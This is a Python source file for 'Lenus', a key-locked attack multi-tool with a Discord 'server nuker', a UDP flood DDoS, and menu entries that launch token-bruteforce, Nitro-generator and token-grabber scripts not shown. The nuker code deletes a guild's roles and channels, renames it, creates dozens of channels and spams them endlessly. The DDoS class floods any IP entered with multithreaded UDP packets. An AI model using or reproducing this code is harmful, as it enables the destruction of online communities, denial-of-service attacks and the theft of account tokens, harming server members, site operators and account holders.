import os
import time
import ctypes
import discord
import socket
import requests
from random import randint
import colorama
from colorama import Fore
from threading import Thread
from discord.ext import commands
colorama.init()
Color_1 = Fore.RED
Color_2 = Fore.GREEN
Color_3 = Fore.YELLOW

# Logos

Lenus_Logo = f"""
{Color_1}                                   ██╗     ███████╗███╗   ██╗██╗   ██╗███████╗
{Color_1}                                   ██║     ██╔════╝████╗  ██║██║   ██║██╔════╝
{Color_1}                                   ██║     █████╗  ██╔██╗ ██║██║   ██║███████╗
{Color_1}                                   ██║     ██╔══╝  ██║╚██╗██║██║   ██║╚════██║
{Color_1}                                   ███████╗███████╗██║ ╚████║╚██████╔╝███████║
{Color_1}                                   ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝
{Color_1}                                                                [By Samir5940]
"""

# Main Options
MainOptions = f"""
 ╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
 ║                                                                                                                     ║
 ║{Color_3}                       1 {Color_1}| Server Nuker               {Color_3}6 {Color_1}| ???               {Color_3}11 {Color_1}| ???                                 ║
 ║{Color_3}                       2 {Color_1}| Token Bruteforce           {Color_3}7 {Color_1}| ???               {Color_3}12 {Color_1}| ???                                 ║
 ║{Color_3}                       3 {Color_1}| Nitro Gen                  {Color_3}8 {Color_1}| ???               {Color_3}13 {Color_1}| ???         00 | EXIT               ║
 ║{Color_3}                       4 {Color_1}| DDoS                       {Color_3}9 {Color_1}| ???               {Color_3}14 {Color_1}| ???                                 ║
 ║{Color_3}                       5 {Color_1}| TokenGrabber              {Color_3}10 {Color_1}| ???               {Color_3}15 {Color_1}| ???                                 ║
 ║                                                                                                                     ║
 ╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
                                                Select an option
"""

Login_Logo = f"""
███████╗███╗   ██╗████████╗███████╗██████╗     ██╗  ██╗███████╗██╗   ██╗
██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗    ██║ ██╔╝██╔════╝╚██╗ ██╔╝
█████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝    █████╔╝ █████╗   ╚████╔╝ 
██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗    ██╔═██╗ ██╔══╝    ╚██╔╝  
███████╗██║ ╚████║   ██║   ███████╗██║  ██║    ██║  ██╗███████╗   ██║   
╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚══════╝   ╚═╝                                                                      
"""

ddosLogo = f"""
{Color_1}                                           ██████╗ ██████╗  ██████╗ ███████╗
{Color_1}                                           ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
{Color_1}                                           ██║  ██║██║  ██║██║   ██║███████╗
{Color_1}                                           ██║  ██║██║  ██║██║   ██║╚════██║
{Color_1}                                           ██████╔╝██████╔╝╚██████╔╝███████║
{Color_1}                                           ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
{Color_1}                                           Please use this tool responsibly.
{Color_1}                                           And note that your IP Address is 
{Color_1}                                               Visible during the attack                               
"""

SNLogo = f"""
            ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
            ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
            ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
            ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
            ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
            ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                                                                                             
"""

# Functions

def mainmenu():
    while True:
        os.system('cls')
        print(Lenus_Logo)
        print(MainOptions)
        ctypes.windll.kernel32.SetConsoleTitleW(f" Lenus ")
        choice = input('==> ')
        
        options = {
            '1': ServerNuker,
            '2': lambda: (os.chdir('tools'), os.system('python brute.py')),
            '3': lambda: (os.chdir('tools'), os.system('python nitrogen.py')),
            '4': ddos,
            '5': lambda: (os.chdir('tools'), os.system('python tokenlog.py')),
            '00': exit
        }
        
        if choice in options:
            options[choice]()
            time.sleep(1)
            break
        else:
            print("Invalid Input! Please enter a valid choice.")
            time.sleep(2)
            continue

def ServerNuker():
                os.system('cls')
                print(SNLogo)
                token = input(f"{Fore.YELLOW}[!] {Fore.WHITE}Enter Your Bot Token: ")
                f = open("tools/ignore/.token", "w")
                f.write(token)
                f.close()

                prefix = input(f"{Fore.YELLOW}[!] {Fore.WHITE}Enter Bot Perfix: ")
                f = open("tools/ignore/.prefix", "w")
                f.write(prefix)
                f.close()

                spammessage = input(f"{Fore.YELLOW}[!] {Fore.WHITE}Spam Message: ")
                f = open("tools/ignore/.message", "w")
                f.write(spammessage)
                f.close()

                channelsname = input(f"{Fore.YELLOW}[!] {Fore.WHITE}Channel Name: ")
                f = open("tools/ignore/.channelsname", "w")
                channelsname = channelsname.lower()
                channelsname.replace("", "-")
                f.write(channelsname)
                f.close()
                snmain()

def snmain():
    
            prefix = open("tools/ignore/.prefix", "r")
            prefix = prefix.read()

            token = open("tools/ignore/.token", "r")
            token = token.read()

            channelsname = open("tools/ignore/.channelsname", "r")
            channelsname = channelsname.read()

            spammessage = open("tools/ignore/.message", "r")
            spammessage = spammessage.read()

            linus = commands.Bot(command_prefix=prefix, intents=discord.Intents().all())
            linus.remove_command('help')

            @linus.event
            async def on_ready():
                if len(linus.guilds) > 1:
                    guildpl = "guilds"
                else:
                    guildpl = "guild"
                activity = discord.Game(name=f"Lenus Server Nuker", type=3)
                await linus.change_presence(status=discord.Status.dnd, activity=activity)
                os.system('cls')
                print(f"{Color_1}Bot : {linus.user} ({len(linus.guilds)} {guildpl})")
                print(f"{Color_1}Prefix : {prefix}")
                print(f"{Color_1}Spam message : {spammessage}")
                print(f"{Color_1}Channels name : {channelsname}")
                print(f"")
                print(f"{Fore.GREEN}type: {prefix}nuke in a channel")
                print(f"")

            @linus.event
            async def on_guild_channel_create(channel):
                while True:
                    await channel.send(spammessage)
                    print(f"{Fore.RED}Sent {Fore.WHITE}: {spammessage}")

            @linus.event
            async def on_guild_join(guild):
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).create_instant_invite:
                        invite = await channel.create_invite()
                        break
                print(f"{Color_1}Joined Server {Fore.WHITE}: {guild.name} ({guild.id}) {invite}")

            @linus.command()
            async def nuke(ctx):
                await ctx.message.delete()
                print(f"{Color_1}Nuking {Fore.WHITE}{ctx.guild.name} ({ctx.guild.id})...")
                await ctx.guild.edit(name="Lenus Runs Discord")
                for role in ctx.guild.roles:
                    try:
                        await role.delete()
                        print(f"{Fore.RED}Deleted{Fore.WHITE}: @{role.name}")
                    except:
                        pass
                        print(f"{Fore.RED}Couldnt Delete{Fore.WHITE}: @{role.name}")

                for channel in ctx.guild.channels:
                    try:
                        await channel.delete()
                        print(f"{Color_1}Deleted{Fore.WHITE}: #{channel.name}")
                    except:
                        pass
                        print(f"{Fore.RED}Couldnt Delete{Fore.WHITE}: #{channel.name}")
                try:
                    for i in range(50):
                        await ctx.guild.create_text_channel(channelsname)
                        print(f"{Fore.RED}Created{Fore.WHITE}: #{channel.name}")
                except Exception as er:
                    print(f"{Fore.RED}Error{Fore.WHITE}: {er}")
            try:
                linus.run(token)
            except Exception as er:
                pass
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error")
                input()

            while True:
                mainmenu()


def ddos():
    os.system('cls')
    print(ddosLogo)
    main()

class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force  # default: 1250
        self.threads = threads  # default: 35

        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()

    def info(self):
        interval = 0.05
        now = time.time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            time.sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(f"{round(size)} Mb/s - Total: {round(self.total, 1)} Gb.", end='\r')

            now2 = time.time()

            if now + 1 >= now2:
                continue

            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                client.sendto(self.data, (self.ip, self.port or randint(1, 65535)))
                self.sent += self.len
            except:
                pass

def main():
    ip = input(f"{Fore.YELLOW}[!] {Fore.WHITE}Enter the IP to hit: ")
    port = input(f"{Fore.YELLOW}[!] {Fore.WHITE}Enter port (Or Enter for Defult): ")
    force = input(f"{Fore.YELLOW}[!] {Fore.WHITE}Bytes per packet (Or Enter For Defult): ")
    threads = input(f"{Fore.YELLOW}[!] {Fore.WHITE}Threads (Or Enter For Defult): ")

    if force == '':
        force = 1250
    else:
        try:
            force = int(force)
        except ValueError:
            print("Invalid input. Bytes per packet should be an integer.")
            return

    if threads == '':
        threads = 35
    else:
        try:
            threads = int(threads)
        except ValueError:
            print("Invalid input. Threads should be an integer.")
            return

    print(f"\nStarting attack on {ip}.")
    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        print("A fatal error has occurred and the attack was stopped.")
        return

    try:
        while True:
            time.sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(f"Attack stopped. {ip} was Hit with {round(brute.total, 1)} Gb.\n")


def login():
    os.system('cls')
    print(Login_Logo)
    pastebin_url = 'https://pastebin.com/raw/EY3shL8c' and 'https://pastebin.com/raw/5isQ6KCp'
    valid_keys = get_valid_keys_from_pastebin(pastebin_url)

    while True:
        user_input = input('Enter key: ')
        
        if user_input in valid_keys:
            print('Access granted.')
            
            mainmenu()
            break
        else:
            print('Invalid key.')

def get_valid_keys_from_pastebin(pastebin_url):
    try:
        response = requests.get(pastebin_url)
        response.raise_for_status()
        keys_text = response.text
        valid_keys = keys_text.split() 
        return valid_keys
    except requests.exceptions.RequestException as e:
        print(f"An error occurred during the request: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
    return []

if __name__ == "__main__":
    login()
